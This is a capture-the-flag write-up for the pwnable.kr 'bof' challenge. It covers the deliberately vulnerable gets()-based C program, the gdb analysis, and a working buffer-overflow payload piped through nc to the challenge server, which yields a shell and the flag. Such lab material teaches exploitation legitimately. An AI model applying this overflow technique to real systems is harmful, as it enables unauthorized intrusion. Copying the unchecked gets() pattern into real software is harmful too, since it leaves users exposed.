# 3 - bof
The second challenge hosted on pwnable.kr

## Description
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

## Solution
Ok, lets start by downloading the provided binary and source code, and taking a look at bof.c.

```
apt-get install libc6-i386
```

Downloading bof.c...
```
wget http://pwnable.kr/bin/bof.c
```

Looking at the source code...
```
$ cat bof.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
We can see that main starts a function, and passes 0xdeadbeef as parameter. this parameter is later compared to 0xcafebabe, and if we can enter this if statement we can get the flag.
So we need to try to change the content of the key variable in the function, so that the if test will resolve to true.
We get a nice hint in the gets function on how to do this :)

Ok, lets compile an executable and get to debugging.
*Note: if you are on a 64bit system you might need to download and install the following package in order to be able to compile it to 32-bit (which makes the adresses a litle bit more bareable)*
```
$ sudo apt-get install g++-multilib
```
Compile it;
```
$ gcc -m32 bof.c -o bof
```
Ok, lets get to debugging! :)

```
$ gdb bof
```
Looking at main we can see the function defined 'func'. Lets inspect it.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804856a <+0>:	lea    0x4(%esp),%ecx
   0x0804856e <+4>:	and    $0xfffffff0,%esp
   0x08048571 <+7>:	pushl  -0x4(%ecx)
   0x08048574 <+10>:	push   %ebp
   0x08048575 <+11>:	mov    %esp,%ebp
   0x08048577 <+13>:	push   %ecx
   0x08048578 <+14>:	sub    $0x4,%esp
   0x0804857b <+17>:	sub    $0xc,%esp
   0x0804857e <+20>:	push   $0xdeadbeef
   0x08048583 <+25>:	call   0x80484fb <func>
   0x08048588 <+30>:	add    $0x10,%esp
   0x0804858b <+33>:	mov    $0x0,%eax
   0x08048590 <+38>:	mov    -0x4(%ebp),%ecx
   0x08048593 <+41>:	leave  
   0x08048594 <+42>:	lea    -0x4(%ecx),%esp
   0x08048597 <+45>:	ret    
End of assembler dump.

(gdb) disas func
Dump of assembler code for function func:
   0x080484fb <+0>:	push   %ebp
   0x080484fc <+1>:	mov    %esp,%ebp
   0x080484fe <+3>:	sub    $0x38,%esp
   0x08048501 <+6>:	mov    %gs:0x14,%eax
   0x08048507 <+12>:	mov    %eax,-0xc(%ebp)
   0x0804850a <+15>:	xor    %eax,%eax
   0x0804850c <+17>:	sub    $0xc,%esp
   0x0804850f <+20>:	push   $0x8048620
   0x08048514 <+25>:	call   0x8048390 <printf@plt>
   0x08048519 <+30>:	add    $0x10,%esp
   0x0804851c <+33>:	sub    $0xc,%esp
   0x0804851f <+36>:	lea    -0x2c(%ebp),%eax
   0x08048522 <+39>:	push   %eax
   0x08048523 <+40>:	call   0x80483a0 <gets@plt>
   0x08048528 <+45>:	add    $0x10,%esp
=> 0x0804852b <+48>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x08048532 <+55>:	jne    0x8048546 <func+75>
   0x08048534 <+57>:	sub    $0xc,%esp
   0x08048537 <+60>:	push   $0x804862f
   0x0804853c <+65>:	call   0x80483d0 <system@plt>
   0x08048541 <+70>:	add    $0x10,%esp
   0x08048544 <+73>:	jmp    0x8048556 <func+91>
   0x08048546 <+75>:	sub    $0xc,%esp
   0x08048549 <+78>:	push   $0x8048637
   0x0804854e <+83>:	call   0x80483c0 <puts@plt>
   0x08048553 <+88>:	add    $0x10,%esp
   0x08048556 <+91>:	nop
   0x08048557 <+92>:	mov    -0xc(%ebp),%eax
   0x0804855a <+95>:	xor    %gs:0x14,%eax
   0x08048561 <+102>:	je     0x8048568 <func+109>
   0x08048563 <+104>:	call   0x80483b0 <__stack_chk_fail@plt>
   0x08048568 <+109>:	leave  
   0x08048569 <+110>:	ret    
End of assembler dump.
```

Great, so we find our comparison, (=>).
We can add a breakpoint by giving it the adress.
```
(gdb) break *0x0804852b
```

Lets try to run it, and see if we can find the local key variable in the memory. I know that A's will appear as \x41 in memory, so I will input a bunch of these to the input to see if I can find them.
```
(gdb) run
Starting program: bo
overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x0804852b in func ()
(gdb)
```
Ok, lets inspect the memory. We can use xw to display 32bit words (instead of 8, making it easier for us to see our patterns).
```
(gdb) x/20xhw $esp
0xffffcd40:	0x00000000	0xffffcde4	0xf7fb7000	0x41414141
0xffffcd50:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd60:	0x41414141	0x41414141	0x41414141	0x39ea8200
0xffffcd70:	0x00000002	0x00000003	0xffffcd98	0x08048588
0xffffcd80:	0xdeadbeef	0xffffce44	0xffffce50	0x080485c1
```
Ok, so we can see where our array of A's start. We can also see that 0xdeadbeef appears exactly 13 words later. Luckily for us, we can remember from bof.c that the variable that our input is assigned to is only allocated 32 bytes, but our input is never checked to be less than 33 bytes. Therefore we can overflow this, and try to change the content of the local key variable, which we now know where is stored. So 13 words * 4 bytes in each word gives us a total of 52 bytes we need to write. Then we can append what we know to be the real password '\xca\xfe\xba\xbe'. However the system is most likely little endian, so we must remember to reverse it,
'\xbe\xba\xfe\xca'.
Thus, our input will be: 52*'A'+'\xbe\xba\xfe\xca'.
We can try  to feed this into our program and verify that we have overwritten the key.
We can give this as stdin to our gdb with python.
```
(gdb) run <<< $(python -c "print'A'*52+'\xbe\xba\xfe\xca'")
Starting program: bo <<< $(python -c "print'A'*52+'\xbe\xba\xfe\xca'")

Breakpoint 1, 0x0804852b in func ()
(gdb) x/20xw $esp
0xffffcd40:	0x00000000	0xffffcde4	0xf7fb7000	0x41414141
0xffffcd50:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd60:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd70:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd80:	0xcafebabe	0xffffce00	0xffffce4c	0x080485c1
```

## Awesome (•̀ᴗ•́)و ̑̑

Lets try and feed it to the ctf server.

```
$ (python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
whoami
bof
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```
